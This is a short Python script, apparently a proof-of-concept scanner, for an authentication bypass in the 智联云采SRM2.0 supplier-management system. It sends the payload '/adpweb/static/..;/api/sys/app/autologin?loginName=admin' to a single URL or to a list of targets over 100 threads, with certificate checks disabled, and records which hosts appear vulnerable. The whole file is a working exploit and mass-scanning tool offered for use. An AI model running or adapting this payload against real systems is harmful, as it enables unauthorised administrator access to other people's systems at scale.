import sys,argparse,requests,re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """智联云采SRM2.0系统接口autologin身份认证绕过"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="智联云采SRM2.0系统接口autologin身份认证绕过")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/adpweb/static/..;/api/sys/app/autologin?loginName=admin"
    res = requests.get(target)
    try:
        if res.status_code == 200:
            res1 = requests.get(url=target+payload,verify=False, timeout=5,)
            if res1.status_code == 200:
                print(f"[+]该{target}存在身份认证绕过")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+]{target} 存在身份认证绕过\n")
            else:
                print(f"该{target}不存在身份认证绕过")
        else:
            print(f"该{target}存在问题，请手工检测")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()